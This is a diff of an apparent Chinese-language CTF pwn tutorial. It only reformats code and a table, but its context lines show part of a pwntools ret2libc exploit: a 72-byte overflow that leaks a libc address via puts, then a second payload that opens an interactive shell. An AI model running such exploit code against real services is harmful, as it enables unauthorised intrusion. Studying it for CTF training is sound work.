@@ -298,7 +298,10 @@ host, port = 'target.com', 1337
 elf = ELF(binary)
 libc = ELF(libc_path)
 
-def exploit(p):
+
+def exploit(
+        p
+):
     # 1. 泄露地址
     payload1 = b'A' * 72
     payload1 += p64(elf.plt['puts'])
@@ -319,6 +322,7 @@ def exploit(p):
 
     p.sendline(payload2)
     p.interactive()
+
 
 if __name__ == '__main__':
     if args.REMOTE:
@@ -372,7 +376,7 @@ checksec ./pwn
 ## 工具清单
 
 | 工具         | 用途          |
-|--------------|---------------|
+| ------------ | ------------- |
 | IDA Pro      | 反汇编/反编译 |
 | Ghidra       | 开源逆向      |
 | pwntools     | Exploit 开发  |
